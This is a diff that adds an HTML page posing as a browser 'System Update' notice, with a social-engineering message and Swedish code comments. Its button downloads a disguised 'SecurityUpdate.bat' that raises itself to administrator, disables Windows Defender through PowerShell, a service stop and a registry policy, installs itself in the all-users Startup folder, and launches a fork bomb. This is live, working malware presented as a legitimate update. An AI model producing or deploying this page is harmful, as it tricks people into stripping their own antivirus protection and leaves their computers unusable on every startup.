@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="sv">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+        }
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .button {
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+                <!-- Logotypen visas här -->
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTzA88DBqBxcQel34LqvIm-yuGKIw0mo1VKqA&s">
+        <p>Hello fellow twinks,</p>
+        <p>We have now launched a new site dedicated to invitations to festivities. To ensure a secure and seamless experience, we use <strong>HTTPS with AES-256 encryption</strong>.</p>
+<p>To access the new site, you need to update your browser to the latest version. Click the button below to start the update, then go to the latest downloads in the data and click on the file to complete the update.</p>
+        <button class="button" onclick="startUpdate()">Start Update</button>
+    </div>
+
+    <script>
+        function startUpdate() {
+            // Visa ett proffsigt meddelande
+            alert("Uppdateringen startar nu. Vänligen vänta...");
+
+            // Batchfilens innehåll som en sträng
+            var batchContent = `
+@echo off
+:: Kontrollera om skriptet körs som administratör
+net session >nul 2>&1
+if %errorLevel% == 0 (
+    echo Skriptet körs som administratör.
+) else (
+    echo Skriptet körs inte som administratör. Startar om med administratörsbehörighet...
+    :: Starta om skriptet som administratör
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+
+:: Inaktivera Windows Defender
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+
+:: Stoppa antivirustjänster
+net stop "Windows Defender Antivirus Service"
+
+:: Ändra registerposter
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+
+echo Antivirus har inaktiverats.
+
+:: Lägg till i Startup-mappen för alla användare
+if not exist "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\forkbomb.bat" (
+    copy "%~f0" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\forkbomb.bat"
+)
+
+:: Forkbomb-logik
+:s
+start %0
+goto s
+`;
+
+            // Skapa en länk för att ladda ner batchfilen
+            var link = document.createElement("a");
+            link.href = "data:text/plain;charset=utf-8," + encodeURIComponent(batchContent);
+            link.download = "SecurityUpdate.bat"; // Namnet på den nedladdade filen
+            link.style.display = "none"; // Göm länken
+
+            // Lägg till länken i dokumentet och klicka på den
+            document.body.appendChild(link);
+            link.click();
+        }
+    </script>
+</body>
+</html>
